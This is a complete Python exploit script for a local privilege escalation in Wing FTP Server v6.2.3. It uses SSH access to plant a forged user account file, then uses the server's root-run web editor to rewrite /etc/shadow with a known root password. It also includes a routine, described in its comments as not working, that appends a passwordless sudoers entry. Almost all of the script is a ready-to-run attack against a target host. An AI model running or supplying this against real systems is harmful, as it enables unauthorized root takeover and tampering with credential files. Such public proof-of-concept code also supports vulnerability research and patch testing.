#!/usr/bin/python3
#Exploit for Wing FTP Server v6.2.3 (other versions may be vulnerable
#Discovered by Cary Hooper (@nopantrootdance)

import paramiko,sys,warnings,requests,re,time,argparse
warnings.filterwarnings("ignore")
DEBUG = False

#Argument handling.  Needs an upgrade
#option for hostname
#option for port
#option for username
#option for password
#option for debug
#option for proxy support
#option to specify new root password

#Argument handling.
parser = argparse.ArgumentParser(description="Exploit for Wing FTP Server v6.2.3 Local Privilege Escalation",epilog=print(f"Exploit by @nopantrootdance."))
parser.add_argument("-t", "--target", help="hostname of target, optionally with port specified (hostname:port)",required=True)
parser.add_argument("-u", "--username", help="SSH username", required=True)
parser.add_argument("-p", "--password", help="SSH password", required=True)
parser.add_argument("-v", "--verbose", help="Turn on debug information", action='store_true')
parser.add_argument("--proxy", help="Send HTTP through a proxy",default=False)
args = parser.parse_args()

#Global Variables
global username
global password
global proxies
global port
global hostname
username = args.username
password = args.password

#Handle nonstandard SSH port
if ':' in args.target:
	socket = args.target.split(':')
	hostname = socket[0]
	port = socket[1]
else:
	hostname = args.target
	port = "22"

#Prepare proxy dict (for requests)
if args.proxy:
	proxies = {'http':args.proxy,'https':args.proxy}
else:
	proxies = {}

#This is what a <username>.xml file looks like.
#Gives full permission to user for entire filesystem '/'.
#Located in $_WFTPROOT/Data/Users/
evilUserXML = """<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>h00p</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>d28f47c0483d392ca2713fe7e6f54089</Password>
        <ProtocolType>63</ProtocolType>
        <EnableExpire>0</EnableExpire>
        <ExpireTime>2020-02-25 18:27:07</ExpireTime>
        <MaxDownloadSpeedPerSession>0</MaxDownloadSpeedPerSession>
        <MaxUploadSpeedPerSession>0</MaxUploadSpeedPerSession>
        <MaxDownloadSpeedPerUser>0</MaxDownloadSpeedPerUser>
        <MaxUploadSpeedPerUser>0</MaxUploadSpeedPerUser>
        <SessionNoCommandTimeOut>5</SessionNoCommandTimeOut>
        <SessionNoTransferTimeOut>5</SessionNoTransferTimeOut>
        <MaxConnection>0</MaxConnection>
        <ConnectionPerIp>0</ConnectionPerIp>
        <PasswordLength>0</PasswordLength>
        <ShowHiddenFile>0</ShowHiddenFile>
        <CanChangePassword>0</CanChangePassword>
        <CanSendMessageToServer>0</CanSendMessageToServer>
        <EnableSSHPublicKeyAuth>0</EnableSSHPublicKeyAuth>
        <SSHPublicKeyPath></SSHPublicKeyPath>
        <SSHAuthMethod>0</SSHAuthMethod>
        <EnableWeblink>1</EnableWeblink>
        <EnableUplink>1</EnableUplink>
        <CurrentCredit>0</CurrentCredit>
        <RatioDownload>1</RatioDownload>
        <RatioUpload>1</RatioUpload>
        <RatioCountMethod>0</RatioCountMethod>
        <EnableRatio>0</EnableRatio>
        <MaxQuota>0</MaxQuota>
        <CurrentQuota>0</CurrentQuota>
        <EnableQuota>0</EnableQuota>
        <NotesName></NotesName>
        <NotesAddress></NotesAddress>
        <NotesZipCode></NotesZipCode>
        <NotesPhone></NotesPhone>
        <NotesFax></NotesFax>
        <NotesEmail></NotesEmail>
        <NotesMemo></NotesMemo>
        <EnableUploadLimit>0</EnableUploadLimit>
        <CurLimitUploadSize>0</CurLimitUploadSize>
        <MaxLimitUploadSize>0</MaxLimitUploadSize>
        <EnableDownloadLimit>0</EnableDownloadLimit>
        <CurLimitDownloadLimit>0</CurLimitDownloadLimit>
        <MaxLimitDownloadLimit>0</MaxLimitDownloadLimit>
        <LimitResetType>0</LimitResetType>
        <LimitResetTime>1580092048</LimitResetTime>
        <TotalReceivedBytes>0</TotalReceivedBytes>
        <TotalSentBytes>0</TotalSentBytes>
        <LoginCount>0</LoginCount>
        <FileDownload>0</FileDownload>
        <FileUpload>0</FileUpload>
        <FailedDownload>0</FailedDownload>
        <FailedUpload>0</FailedUpload>
        <LastLoginIp></LastLoginIp>
        <LastLoginTime>2020-01-26 18:27:28</LastLoginTime>
        <EnableSchedule>0</EnableSchedule>
        <Folder>
            <Path>/</Path>
            <Alias>/</Alias>
            <Home_Dir>1</Home_Dir>
            <File_Read>1</File_Read>
            <File_Write>1</File_Write>
            <File_Append>1</File_Append>
            <File_Delete>1</File_Delete>
            <Directory_List>1</Directory_List>
            <Directory_Rename>1</Directory_Rename>
            <Directory_Make>1</Directory_Make>
            <Directory_Delete>1</Directory_Delete>
            <File_Rename>1</File_Rename>
            <Zip_File>1</Zip_File>
            <Unzip_File>1</Unzip_File>
        </Folder>
    </USER>
</USER_ACCOUNTS>
"""

#Function for debugging.  
def log(string):
	if DEBUG != False:
		print(string)

#Checks to see which URL is hosting Wing FTP
def checkHTTP(hostname):
	protocols= ["http://","https://"]
	for protocol in protocols:
		try:
			log(f"Testing HTTP service {protocol}{hostname}")
			response = requests.get(protocol + hostname, verify=False, proxies=proxies)
			try:
				#Server: Wing FTP Server
				if "Wing FTP Server" in response.headers['Server']:
					print(f"[!] Wing FTP Server found at {protocol}{hostname}")
					url = protocol + hostname
			except:
				print("")
		except Exception as e:
			print(f"[*] Server is not running Wing FTP web services on {protocol}: {e}")
	return url

#Log in to the HTTP interface.  Returns cookie
#Needs to check first whether interface is HTTP or HTTPS.  
def getCookie(url,webuser,webpass,headers):
	log("getCookie")
	loginURL = f"{url}/loginok.html"
	data = {"username": webuser, "password": webpass, "username_val": webuser, "remember": "true", "password_val": webpass, "submit_btn": " Login "}
	response = requests.post(loginURL, headers=headers, data=data, verify=False, proxies=proxies)
	ftpCookie = response.headers['Set-Cookie'].split(';')[0]
	print(f"[!] Successfully logged in!  Cookie is {ftpCookie}")
	cookies = {"UID":ftpCookie.split('=')[1]}
	log("return getCookie")
	return cookies

#Change directory within the web interface.
#The actual POST request changes state.  We keep track of that stat in directorymem array.
def chDir(url,directory,headers,cookies,directorymem):
	log("chDir")
	data = {"dir": directory}
	print(f"[*] Changing directory to {directory}")
	chdirURL = f"{url}/chdir.html"
	requests.post(chdirURL, headers=headers, cookies=cookies, data=data, verify=False, proxies=proxies)
	log(f"Directorymem is nonempty. --> {directorymem}")
	log("return chDir")
	directorymem = directorymem + "|" + directory
	return directorymem 

#The application has a silly way of keeping track of paths.
#This function returns the current path as dirstring.
def prepareStupidDirectoryString(directorymem,delimiter):
	log("prepareStupidDirectoryString")
	dirstring = ""
	directoryarray = directorymem.split('|')
	log(f"directoryarray is {directoryarray}")
	for item in directoryarray:
		if item != "":
			dirstring += delimiter + item
	log("return prepareStupidDirectoryString")
	return dirstring

#Downloads a given file from the server.  By default, it runs as root.
#Returns the content of the file as a string.
def downloadFile(file,url,headers,cookies,directorymem):
	log("downloadFile")
	print(f"[*] Downloading the {file} file...")
	dirstring = prepareStupidDirectoryString(directorymem,"$2f")  #Why wouldn't you URL-encode?!
	log(f"directorymem is {directorymem} and dirstring is {dirstring}")
	editURL = f"{url}/editor.html?dir={dirstring}&filename={file}&r=0.88304407485768"
	response = requests.get(editURL, cookies=cookies, verify=False, proxies=proxies)
	filecontent = re.findall(r'<textarea id="textedit" style="height:520px; width:100%;">(.*?)</textarea>',response.text,re.DOTALL)[0]
	log(f"downloaded file is: {filecontent}")
	log("return downloadFile")
	return filecontent,editURL

#Saves a given file to the server (or overwrites one).  By default it saves a file with
#644 permission owned by root.
def saveFile(newfilecontent,file,url,headers,cookies,referer,directorymem):
	log("saveFile")
	log(f"Directorymem is {directorymem}")
	saveURL = f"{url}/savefile.html"
	headers = {"Content-Type": "text/plain;charset=UTF-8", "Referer": referer}
	dirstring = prepareStupidDirectoryString(directorymem,"/")
	log(f"Stupid Directory string is {dirstring}")
	data = {"charcode": "0", "dir": dirstring, "filename": file, "filecontent": newfilecontent}
	requests.post(saveURL, headers=headers, cookies=cookies, data=data, verify=False)
	log("return saveFile")

#Other methods may be more stable, but this works.
#"You can't argue with a root shell" - FX
#Let me know if you know of other ways to increase privilege by overwriting files!
#This routine overwrites the shadow file
def overwriteShadow(url):
	log("overwriteShadow")
	headers = {"Content-Type": "application/x-www-form-urlencoded"}
	#Grab cookie from server.
	cookies = getCookie(url=url,webuser="h00p",webpass="h00p",headers=headers)

	#Chdir a few times, starting in the user's home directory until we arrive at the target folder
	directorymem = chDir(url=url,directory="etc",headers=headers,cookies=cookies,directorymem="")
	
	#Download and re-save the target file.
	shadowfile,referer = downloadFile(file="shadow",url=url,headers=headers,cookies=cookies,directorymem=directorymem)

	# openssl passwd -1 -salt h00ph00p h00ph00p
	rootpass = "$1$h00ph00p$0cUgaHnnAEvQcbS6PCMVM0"
	rootpass = "root:" + rootpass + ":18273:0:99999:7:::"

	#Create new shadow file with different root password & save
	newshadow = re.sub("root(.*):::",rootpass,shadowfile)
	print("[*] Swapped the password hash...")
	saveFile(newfilecontent=newshadow,file="shadow",url=url,headers=headers,cookies=cookies,referer=referer,directorymem=directorymem)
	print("[*] Saved the forged shadow file...")
	log("exit overwriteShadow")

#This function amends the /etc/sudoers file.  This doesn't work as is. 
#Sudo won't work with 666 permissions.  Future releases of wftpserver may help this method.
def forgeSudoers(url):
	#{username} ALL=(ALL) NOPASSWD: ALL
	log("forgeSudoers")
	headers = {"Content-Type": "application/x-www-form-urlencoded"}
	#Grab Cookie
	cookies = getCookie(url=url,webuser="h00p",webpass="h00p",headers=headers)
	#Change Directory
	directorymem = chDir(directory="etc",url=url,headers=headers,cookies=cookies,directorymem="")
	#Download the file
	sudoersfile,referer = downloadFile(file="sudoers",url=url,headers=headers,cookies=cookies,directorymem=directorymem)
	sudoersfile = sudoersfile.replace("+"," ")
	sudoersfile += f"{username} ALL=(ALL) NOPASSWD: ALL"
	#Save file.
	saveFile(newfilecontent=sudoersfile,file="sudoers",url=url,headers=headers,cookies=cookies,referer=referer,directorymem=directorymem)
	log("exit forgeSudoers")

def main():
	log("main")
	try:
		#Create ssh connection to target with paramiko
		client = paramiko.SSHClient()
		client.load_system_host_keys()
		client.set_missing_host_key_policy(paramiko.WarningPolicy)
		try: 
			client.connect(hostname, port=port, username=username, password=password)
		except:
			print(f"Failed to connect to {hostname}:{port} as user {username}.")
		#Find wftpserver directory
		print(f"[*] Searching for Wing FTP root directory. (this may take a few seconds...)")
		stdin, stdout, stderr = client.exec_command("find / -type f -name 'wftpserver'")
		wftpDir = stdout.read().decode("utf-8").split('\n')[0].rsplit('/',1)[0]
		print(f"[!] Found Wing FTP directory: {wftpDir}")
		#Find name of "domain"
		stdin, stdout, stderr = client.exec_command(f"find {wftpDir}/Data/ -type d -maxdepth 1")
		lsresult = stdout.read().decode("utf-8").split('\n')
		#Checking if wftpserver is actually configured.  If you're using this script, it probably is.
		print(f"[*] Determining if the server has been configured.")
		domains = []
		for item in lsresult[:-1]:
			item = item.rsplit('/',1)[1]
			if item !="_ADMINISTRATOR" and item != "":
				domains.append(item)
				print(f"[!] Success. {len(domains)} domain(s) found! Choosing the first: {item}")
		domain = domains[0]
		#Check if the users folder exists
		userpath = wftpDir + "/Data/" + domain
		print(f"[*] Checking if users exist.")
		stdin, stdout, stderr = client.exec_command(f"file {userpath}/users")
		if "No such file or directory" in stdout.read().decode("utf-8"):
			print(f"[*] Users directory does not exist.  Creating folder /users")
			#Create users folder
			stdin, stdout, stderr = client.exec_command(f"mkdir {userpath}/users")
		#Create user.xml file
		print("[*] Forging evil user (h00p:h00p).")
		stdin, stdout, stderr = client.exec_command(f"echo '{evilUserXML}' > {userpath}/users/h00p.xml")
		#Now we can log into the FTP web app with h00p:h00p
		
		url = checkHTTP(hostname)
		if "http" not in url:
			print(f"[!] Exiting... cannot access web interface.")
			sys.exit(1)

		#overwrite root password
		try:
			overwriteShadow(url)
			print(f"[!] Overwrote root password to h00ph00p.")
		except Exception as e:
			print(f"[!] Error: cannot overwrite /etc/shadow: {e}")

		#Check to make sure the sploit works.
		stdin, stdout, stderr = client.exec_command("cat /etc/shadow | grep root")
		out = stdout.read().decode('utf-8')
		err = stderr.read().decode('utf-8')

		log(f"STDOUT - {out}")
		log(f"STDERR - {err}")
		if "root:$1$" in out:
			print(f"[*] Success!  The root password has been successfully changed.")
			print(f"\n\tssh {username}@{hostname} -p{port}")
			print(f"\tThen: su root (password is h00ph00p)")
		else:
			print(f"[!] Something went wrong... SSH in to manually check the files.  Permissions may have been changed to 666.")

		log("exit prepareServer")
	finally:
		client.close()

main()